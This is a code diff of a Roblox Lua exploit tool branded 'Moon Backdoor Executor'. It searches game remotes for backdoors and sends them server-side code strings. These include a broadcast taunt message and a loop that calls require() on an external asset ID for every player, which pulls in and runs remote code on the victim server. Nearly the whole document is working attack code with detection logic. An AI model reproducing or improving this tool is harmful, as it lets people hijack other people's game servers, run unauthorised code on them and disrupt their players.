@@ -1,10 +1,5 @@
 --[=[
- d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
-88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
-88      88    88    88            odD'      88      88    88 88ooo88 
-88  ooo 88    88    88          .88'        88      88    88 88~~~88 
-88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
- Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+ Moon Backdoor Executor
 ]=]
 
 -- Instances: 172 | Scripts: 23 | Modules: 0 | Tags: 0
@@ -1761,10 +1756,13 @@ local function C_f()
 			found = false
 		}
 
+
+
 		local RE = [[
-		for _, lol in pairs(game.Players:GetPlayers()) do
-			lol:LoadCharacter()
-		end
+		local m = Instance.new("Message", game.Workspace)
+		m.Text = "Moon Backdoor On top !!"
+		wait(4)
+		m:Destroy()
 		]]
 
 
@@ -1792,28 +1790,24 @@ local function C_f()
 		local name = [[
 		for _, lol in pairs(game.Players:GetPlayers()) do
 			require(127069679415069)(lol.Name)
-	end
-	
-	game.Players.PlayerAdded:Connect(function(player)
-			require(127069679415069)(player.Name)
-	end)
+	    end
 		]]
 
 		pcall(function()
 			if isFunction then
 				task.spawn(function() 
-					pcall(function() remote:InvokeServer(name) end)
 					pcall(function() remote:InvokeServer(payload) end)
 					pcall(function() remote:InvokeServer("moonTSS", payload) end)
 					pcall(function() remote:InvokeServer(RE) end)
 					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
+					pcall(function() remote:InvokeServer(name) end)
 				end)
 			else
-				pcall(function() remote:FireServer(name) end)
 				pcall(function() remote:FireServer(payload) end)
 				pcall(function() remote:FireServer("moonTSS", payload) end)
 				pcall(function() remote:FireServer(RE) end)
 				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
+				pcall(function() remote:FireServer(name) end)
 			end
 		end)
 
@@ -3057,7 +3051,7 @@ local function C_6a()
 					local testId = activeTestIds[i]
 					local testData = activeTests[testId]
 
-					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
+					if testData and (testData.found or  ReplicatedStorage:FindFirstChild(testId)) then
 						testData.found = true
 						foundExploit = true
 						if testData.isFunction then
